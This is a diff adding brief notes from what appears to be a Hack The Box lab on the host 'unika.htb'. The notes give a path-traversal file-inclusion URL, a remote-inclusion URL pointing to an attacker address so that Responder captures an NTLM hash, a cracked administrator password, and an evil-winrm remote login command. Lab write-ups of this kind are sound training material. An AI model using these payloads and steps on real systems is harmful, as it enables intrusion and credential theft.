@@ -1,0 +1,25 @@
+Windows LFI
+------------
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+
+Use RFI and Responder to generate NTLM hash
+--------------------------------------------
+
+http://unika.htb/index.php?page=//10.10.14.61/somefile (RFI)
+
+#responder -I tun0 
+
+badminton
+
+
+If we got username and password, we can use evil-winrm to connect remotely.
+
+#evil-winrm -u administrator -p badminton -i 10.129.19.219
+
+
+
+
+
+
+
